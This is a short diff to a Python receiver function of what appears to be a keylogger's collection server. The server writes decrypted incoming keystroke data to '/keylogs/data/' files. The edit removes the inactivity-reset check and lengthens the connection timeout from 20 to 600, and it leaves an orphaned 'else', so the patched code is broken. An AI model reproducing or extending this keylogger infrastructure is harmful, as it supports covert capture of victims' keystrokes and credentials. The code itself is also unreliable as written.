@@ -176,11 +176,9 @@ def receiver(port):
                 f.write(dechiffrement(data))
                 print(f"\n{client_address} - ONLINE")
                 print("Update sur /keylogs/data/" + ficname)
-            if str(dechiffrement(data)) != "" :
-                buffer_time = 0
             else:
                 buffer_time = buffer_time + 1
-        if buffer_time == 20:
+        if buffer_time == 600:
             client_socket.close()
             server_socket.close()
             return False
